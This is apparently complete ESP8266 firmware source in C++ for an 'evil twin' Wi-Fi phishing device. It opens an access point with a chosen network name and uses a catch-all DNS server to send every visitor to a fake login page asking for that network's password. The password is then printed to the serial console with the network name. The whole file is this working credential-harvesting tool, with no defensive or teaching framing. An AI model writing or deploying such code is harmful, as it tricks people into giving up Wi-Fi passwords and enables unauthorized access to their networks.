#include"Access_Point.h"

IPAddress local_IP(192,168,4,22);
IPAddress subnet(255,255,255,0);
ESP8266WebServer server(DEFAULT_PORT); // Define the variable
DNSServer dnsServer; // Define the variable

namespace Access_Point{
    String getHTML(const String& SSID){
        String HTMLTemplate = 
        R"rawliteral(<!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width", initial-scale=1.0>
                <style>
                *{
                    color: Black;
                    size: 20px;
                }
                body {
                    background-color: coral;
                }
                
                </style>
            </head>
            <body>
                <div id ="mainContainer">
                    <h1>Loggin on to {{SSID}}</h1>
                    <form id = "inputForm" action = "\submit" method = "post">
                        <label for="passwordInput">Password: (30 characters max)</label><br>
                        <input type="text" class="inputBar" name="passwordInput"><br><br>
                        <input type="submit" value="Enter">
                    </form>
                </div>
            </body>
        </html>)rawliteral";

        HTMLTemplate.replace("{{SSID}}", SSID);
        return HTMLTemplate;
    }

    void handleConnect(const String& SSID){
        Serial.println("Page Visited.");
        server.send(200, "text/html", getHTML(SSID));

    }

    void handleSubmit(const String& SSID) {
        if (server.hasArg("passwordInput")) {
            String userPW = server.arg("passwordInput");
            Serial.println("--------NEW PASSWORD SUBMISSION--------");
            Serial.printf("SSID: %s\n", SSID.c_str());
            Serial.printf("Password: %s\n", userPW.c_str());

            server.send(200, "text/html", getHTML(SSID));
        }
    }
} 

bool createAP(String custom_AP_SSID){
    Serial.print("Creating network: ");
    Serial.println(custom_AP_SSID);
    
    if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
        Serial.println("Failed to configure AP");
        return false;
    }
    
    if (!WiFi.softAP(custom_AP_SSID)) {
        Serial.println("Failed to start AP");
        return false;
    }

    if(!dnsServer.start(DNS_PORT, "*", local_IP)){
        Serial.println("Failed to start DNS Server");
        return false;
    }

    delay(500);

    Serial.println("\nHTTP server started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());

    server.onNotFound([custom_AP_SSID]() {
        Access_Point::handleConnect(custom_AP_SSID);
    });

    server.on("/submit", [custom_AP_SSID]() {
        Access_Point::handleSubmit(custom_AP_SSID);
    });
    //server.onNotFound(handleNotFound);
    server.begin();
    
    return true;
}